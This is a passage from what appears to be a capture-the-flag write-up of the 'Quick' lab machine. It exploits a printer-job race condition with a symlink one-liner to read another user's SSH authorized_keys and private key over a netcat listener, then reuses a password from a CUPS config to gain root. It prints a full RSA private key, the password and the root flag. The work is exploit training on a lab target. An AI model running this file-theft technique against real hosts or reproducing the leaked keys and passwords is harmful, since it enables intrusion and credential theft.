+<p><img src="./screenshots/61_quick/printerv2_job.png" alt="printerv2_job" /></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ printed_text</span><span class="o">=</span><span class="s1">'Something that will be sent to the printer'</span>
+<span class="nv">$ </span>curl <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s2">"title=jebidiah&amp;desc=</span><span class="nv">$printed_text</span><span class="s2">&amp;submit="</span> <span class="nt">-H</span> <span class="s1">'Cookie: PHPSESSID=p0qavq2tftut9ia1vcf6haffqo'</span> http://printerv2.quick.htb:9001/job.php
+</code></pre></div></div>
+
+<h4 id="543-exploiting-the-printer-jobs">5.4.3 Exploiting the Printer Jobs</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
+require __DIR__ <span class="nb">.</span> <span class="s1">'/escpos-php/vendor/autoload.php'</span><span class="p">;</span>
+use Mike42<span class="se">\E</span>scpos<span class="se">\P</span>rintConnectors<span class="se">\N</span>etworkPrintConnector<span class="p">;</span>
+use Mike42<span class="se">\E</span>scpos<span class="se">\P</span>rinter<span class="p">;</span>
+include<span class="o">(</span><span class="s2">"db.php"</span><span class="o">)</span><span class="p">;</span>
+session_start<span class="o">()</span><span class="p">;</span>
+
+<span class="k">if</span><span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s2">"loggedin"</span><span class="o">])</span>
+<span class="o">{</span>
+	<span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s2">"submit"</span><span class="o">]))</span>
+	<span class="o">{</span>
+		<span class="nv">$title</span><span class="o">=</span><span class="nv">$_POST</span><span class="o">[</span><span class="s2">"title"</span><span class="o">]</span><span class="p">;</span>
+		<span class="nv">$file</span> <span class="o">=</span> <span class="nb">date</span><span class="o">(</span><span class="s2">"Y-m-d_H:i:s"</span><span class="o">)</span><span class="p">;</span>
+		file_put_contents<span class="o">(</span><span class="s2">"/var/www/jobs/"</span>.<span class="nv">$file</span>,<span class="nv">$_POST</span><span class="o">[</span><span class="s2">"desc"</span><span class="o">])</span><span class="p">;</span>
+		<span class="nb">chmod</span><span class="o">(</span><span class="s2">"/var/www/printer/jobs/"</span>.<span class="nv">$file</span>,<span class="s2">"0777"</span><span class="o">)</span><span class="p">;</span>
+		<span class="nv">$stmt</span><span class="o">=</span><span class="nv">$conn</span>-&gt;prepare<span class="o">(</span><span class="s2">"select ip,port from jobs"</span><span class="o">)</span><span class="p">;</span>
+		<span class="nv">$stmt</span>-&gt;execute<span class="o">()</span><span class="p">;</span>
+		<span class="nv">$result</span><span class="o">=</span><span class="nv">$stmt</span>-&gt;get_result<span class="o">()</span><span class="p">;</span>
+		<span class="k">if</span><span class="o">(</span><span class="nv">$result</span>-&gt;num_rows <span class="o">&gt;</span> 0<span class="o">)</span>
+		<span class="o">{</span>
+			<span class="nv">$row</span><span class="o">=</span><span class="nv">$result</span>-&gt;fetch_assoc<span class="o">()</span><span class="p">;</span>
+			<span class="nv">$ip</span><span class="o">=</span><span class="nv">$row</span><span class="o">[</span><span class="s2">"ip"</span><span class="o">]</span><span class="p">;</span>
+			<span class="nv">$port</span><span class="o">=</span><span class="nv">$row</span><span class="o">[</span><span class="s2">"port"</span><span class="o">]</span><span class="p">;</span>
+			try
+			<span class="o">{</span>
+				<span class="nv">$connector</span> <span class="o">=</span> new NetworkPrintConnector<span class="o">(</span><span class="nv">$ip</span>,<span class="nv">$port</span><span class="o">)</span><span class="p">;</span>
+				<span class="nb">sleep</span><span class="o">(</span>0.5<span class="o">)</span><span class="p">;</span> //Buffer <span class="k">for </span>socket check
+				<span class="nv">$printer</span> <span class="o">=</span> new Printer<span class="o">(</span><span class="nv">$connector</span><span class="o">)</span><span class="p">;</span>
+				<span class="nv">$printer</span> -&gt; text<span class="o">(</span>file_get_contents<span class="o">(</span><span class="s2">"/var/www/jobs/"</span>.<span class="nv">$file</span><span class="o">))</span><span class="p">;</span>
+				<span class="nv">$printer</span> -&gt; <span class="nb">cut</span><span class="o">()</span><span class="p">;</span>
+				<span class="nv">$printer</span> -&gt; close<span class="o">()</span><span class="p">;</span>
+				<span class="nv">$message</span><span class="o">=</span><span class="s2">"Job assigned"</span><span class="p">;</span>
+				<span class="nb">unlink</span><span class="o">(</span><span class="s2">"/var/www/jobs/"</span>.<span class="nv">$file</span><span class="o">)</span><span class="p">;</span>
+			<span class="o">}</span>
+			catch<span class="o">(</span>Exception <span class="nv">$error</span><span class="o">)</span> 
+			<span class="o">{</span>
+				<span class="nv">$error</span><span class="o">=</span><span class="s2">"Can't connect to printer."</span><span class="p">;</span>
+				<span class="nb">unlink</span><span class="o">(</span><span class="s2">"/var/www/jobs/"</span>.<span class="nv">$file</span><span class="o">)</span><span class="p">;</span>
+			<span class="o">}</span>
+		<span class="o">}</span>
+		<span class="k">else</span>
+		<span class="o">{</span>
+			<span class="nv">$error</span><span class="o">=</span><span class="s2">"Couldn't find printer."</span><span class="p">;</span>
+		<span class="o">}</span>
+	<span class="o">}</span>
+?&gt;
+<span class="o">[</span>...html...]
+&lt;?php <span class="o">}</span> 
+<span class="k">else</span>
+<span class="o">{</span>
+	<span class="nb">echo</span> <span class="s1">'&lt;script&gt;alert("Invalid Username/Password");window.location.href="index.php";&lt;/script&gt;'</span><span class="p">;</span>
+<span class="o">}</span>?&gt;
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@quick:~<span class="nv">$ </span><span class="k">while</span> <span class="o">[</span> <span class="nt">-z</span> <span class="si">$(</span><span class="nb">ls</span> <span class="nt">-tr</span> /var/www/jobs<span class="si">)</span> <span class="o">]</span><span class="p">;</span> <span class="k">do</span> : <span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="nv">job</span><span class="o">=</span><span class="si">$(</span><span class="nb">ls</span> <span class="nt">-tr</span> /var/www/jobs | <span class="nb">head</span> <span class="nt">-n1</span><span class="si">)</span><span class="p">;</span> <span class="nb">rm</span> <span class="nt">-f</span> <span class="s2">"/var/www/jobs/</span><span class="k">${</span><span class="nv">job</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="nb">ln</span> <span class="nt">-s</span> /home/srvadm/.ssh/authorized_keys /var/www/jobs/<span class="k">${</span><span class="nv">job</span><span class="k">}</span>
+</code></pre></div></div>
+
+<p>The bash script executed above will wait for a new print job to be created and then leveraging the 0.5 seconds sleep time of the job execution by deleting and replacing the file with a similar filename but symbolically linked to a file of your choice; in this case – <code class="highlighter-rouge">/home/srvadm/.ssh/authorized_keys</code></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s2">"title=jebidiah&amp;desc=</span><span class="nv">$printed_text</span><span class="s2">&amp;submit="</span> <span class="nt">-H</span> <span class="s1">'Cookie: PHPSESSID=p0qavq2tftut9ia1vcf6haffqo'</span> <span class="nt">--silent</span> http://printerv2.quick.htb:9001/job.php <span class="o">&gt;</span>/dev/null
+</code></pre></div></div>
+
+<p>After starting a listener on port 9100 using netcat, the job will be triggered by the command above.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-k</span> <span class="nt">-nlvp</span> 9100
+
+  connect to <span class="o">[</span>10.10.14.6] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.186] 55768
+  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC61KWlksWhB9tpFPs7ys/wuyMTzhAk95ZAmOLowXRL9EYJ3g8A/VRYPboIBoPLgnsHZ/kz+jlcRghl5H4opKH6YP/8U7L47eyohfftqcWqq+ElDoPUvZY6yRajJnMapvyv3iA31NdbxNGXPuEyqraN9YGAabdhXMwphJixaLp1VhOVUZgMs1v/zxqBRAZHxwA1GKz/ZyRYr4aLJOjmmBlpydI3/rWnUK2/QgL/MI4jmn0Iqd3CE69uaPM2+H9vR5dthD9GnmvIu5IktnVo+u0r4sKeqMorSHAfyAqR1mT93c5+riKFGJCVqTA+WwfLZqbU76yaDTbXgczJBB2fuUT1 srvadm@quick
+  VA
+</code></pre></div></div>
+
+<p>Looking back to the listener, the contents of the <code class="highlighter-rouge">authorized_keys</code> file has now been sent to the “printer” meaning the <strong>arbitrary file read</strong> of files owned or readable by <strong><code class="highlighter-rouge">sysadm</code></strong> succeeded.</p>
+
+<h4 id="544-reading-files-with-sysadm">5.4.4 Reading files with <code class="highlighter-rouge">sysadm</code></h4>
+
+<p>Now to see if there is also a private key stored in the same directory using the same process above:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sam@quick:~<span class="nv">$ </span><span class="k">while</span> <span class="o">[</span> <span class="nt">-z</span> <span class="si">$(</span><span class="nb">ls</span> <span class="nt">-tr</span> /var/www/jobs<span class="si">)</span> <span class="o">]</span><span class="p">;</span> <span class="k">do</span> : <span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="nv">job</span><span class="o">=</span><span class="si">$(</span><span class="nb">ls</span> <span class="nt">-tr</span> /var/www/jobs | <span class="nb">head</span> <span class="nt">-n1</span><span class="si">)</span><span class="p">;</span> <span class="nb">rm</span> <span class="nt">-f</span> <span class="s2">"/var/www/jobs/</span><span class="k">${</span><span class="nv">job</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="nb">ln</span> <span class="nt">-s</span> /home/srvadm/.ssh/id_rsa /var/www/jobs/<span class="k">${</span><span class="nv">job</span><span class="k">}</span>
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s2">"title=jebidiah&amp;desc=</span><span class="nv">$printed_text</span><span class="s2">&amp;submit="</span> <span class="nt">-H</span> <span class="s1">'Cookie: PHPSESSID=p0qavq2tftut9ia1vcf6haffqo'</span> <span class="nt">--silent</span> http://printerv2.quick.htb:9001/job.php <span class="o">&gt;</span>/dev/null
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lvp</span> 9100
+
+  connect to <span class="o">[</span>10.10.14.6] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.186] 55756
+  <span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
+  MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4P
+  AP1UWD26CAaDy4J7B2f5M/o5XEYIZeR+KKSh+mD//FOy+O3sqIX37anFqqvhJQ6D
+  1L2WOskWoyZzGqb8r94gN9TXW8TRlz7hMqq2jfWBgGm3YVzMKYSYsWi6dVYTlVGY
+  DLNb/88agUQGR8cANRis/2ckWK+GiyTo5pgZacnSN/61p1Ctv0IC/zCOI5p9CKnd
+  whOvbmjzNvh/b0eXbYQ/Rp5ryLuSJLZ1aPrtK+LCnqjKK0hwH8gKkdZk/d3Ofq4i
+  hRiQlakwPlsHy2am1O+smg0214HMyQQdn7lE9QIDAQABAoIBAG2zSKQkvxgjdeiI
+  ok/kcR5ns1wApagfHEFHxAxo8vFaN/m5QlQRa4H4lI/7y00mizi5CzFC3oVYtbum
+  Y5FXwagzZntxZegWQ9xb9Uy+X8sr6yIIGM5El75iroETpYhjvoFBSuedeOpwcaR+
+  DlritBg8rFKLQFrR0ysZqVKaLMmRxPutqvhd1vOZDO4R/8ZMKggFnPC03AkgXkp3
+  j8+ktSPW6THykwGnHXY/vkMAS2H3dBhmecA/Ks6V8h5htvybhDLuUMd++K6Fqo/B
+  H14kq+y0Vfjs37vcNR5G7E+7hNw3zv5N8uchP23TZn2MynsujZ3TwbwOV5pw/CxO
+  9nb7BSECgYEA5hMD4QRo35OwM/LCu5XCJjGardhHn83OIPUEmVePJ1SGCam6oxvc
+  bAA5n83ERMXpDmE4I7y3CNrd9DS/uUae9q4CN/5gjEcc9Z1E81U64v7+H8VK3rue
+  F6PinFsdov50tWJbxSYr0dIktSuUUPZrR+in5SOzP77kxZL4QtRE710CgYEAz+It
+  T/TMzWbl+9uLAyanQObr5gD1UmG5fdYcutTB+8JOXGKFDIyY+oVMwoU1jzk7KUtw
+  8MzyuG8D1icVysRXHU8btn5t1l51RXu0HsBmJ9LaySWFRbNt9bc7FErajJr8Dakj
+  b4gu9IKHcGchN2akH3KZ6lz/ayIAxFtadrTMinkCgYEAxpZzKq6btx/LX4uS+kdx
+  pXX7hULBz/XcjiXvKkyhi9kxOPX/2voZcD9hfcYmOxZ466iOxIoHkuUX38oIEuwa
+  GeJol9xBidN386kj8sUGZxiiUNoCne5jrxQObddX5XCtXELh43HnMNyqQpazFo8c
+  Wp0/DlGaTtN+s+r/zu9Z8SECgYEAtfvuZvyK/ZWC6AS9oTiJWovNH0DfggsC82Ip
+  LHVsjBUBvGaSyvWaRlXDaNZsmMElRXVBncwM/+BPn33/2c4f5QyH2i67wNpYF0e/
+  2tvbkilIVqZ+ERKOxHhvQ8hzontbBCp5Vv4E/Q/3uTLPJUy5iL4ud7iJ8SOHQF4o
+  x5pnJSECgYEA4gk6oVOHMVtxrXh3ASZyQIn6VKO+cIXHj72RAsFAD/98intvVsA3
+  +DvKZu+NeroPtaI7NZv6muiaK7ZZgGcp4zEHRwxM+xQvxJpd3YzaKWZbCIPDDT/u
+  NJx1AkN7Gr9v4WjccrSk1hitPE1w6cmBNStwaQWD+KUUEeWYUAx20RA<span class="o">=</span>
+  <span class="nt">-----END</span> RSA PRIVATE KEY-----
+  VA
+</code></pre></div></div>
+
+<p>Luckily, there is also a private key stored in the <code class="highlighter-rouge">.ssh</code> directory.</p>
+
+<h3 id="55-connecting-via-ssh-with-sysadm">5.5 Connecting via SSH with <code class="highlighter-rouge">sysadm</code></h3>
+
+<hr />
+
+<h2 id="part-6--privilege-escalation">PART 6 : PRIVILEGE ESCALATION</h2>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>srvadm@quick:~/.cache/conf.d<span class="nv">$ </span><span class="nb">cat </span>printers.conf
+</code></pre></div></div>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  # Printer configuration file for CUPS v2.3.0
+  # Written by cupsd on 2020-02-18 17:11
+  # DO NOT EDIT THIS FILE WHEN CUPSD IS RUNNING
+  NextPrinterId 5
+  [...omitted...]
+  <span class="nt">&lt;Printer</span> <span class="err">OLD_Aviatar</span><span class="nt">&gt;</span>
+  PrinterId 2
+  UUID urn:uuid:0929509f-7173-3afd-6be2-4da0a43ccefe
+  Info 8595
+  Location Aviatar
+  MakeModel KONICA MINOLTA C554SeriesPS(P)
+  DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
+  State Idle
+  StateTime 1549274624
+  ConfigTime 1549274625
+  Type 8401100
+  Accepting Yes
+  Shared Yes
+  JobSheets none none
+  QuotaPeriod 0
+  PageLimit 0
+  KLimit 0
+  OpPolicy default
+  ErrorPolicy stop-printer
+  Option job-cancel-after 10800
+  Option media 1
+  Option output-bin 0
+  Option print-color-mode color
+  Option print-quality 5
+  <span class="nt">&lt;/Printer&gt;</span>
+  [...omitted...]
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>srvadm@quick:~/.cache/conf.d<span class="nv">$ </span>su -
+
+  Password: &amp;ftQ4K3SGde8?
+
+root@quick:~# <span class="nb">cat</span> /root/root.txt
+
+  8289e54cd2bd1b9db9fc54447fea0db2
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="part-7--references">PART 7 : REFERENCES</h2>
+
+<ul>
+  <li>https://www.google.com/search?client=firefox-b-d&amp;q=quic+udp+port</li>
+  <li>
+    <p>https://github.com/curl/curl/blob/master/docs/HTTP3.md</p>
+  </li>
+  <li>https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/</li>
+</ul>
+:ET
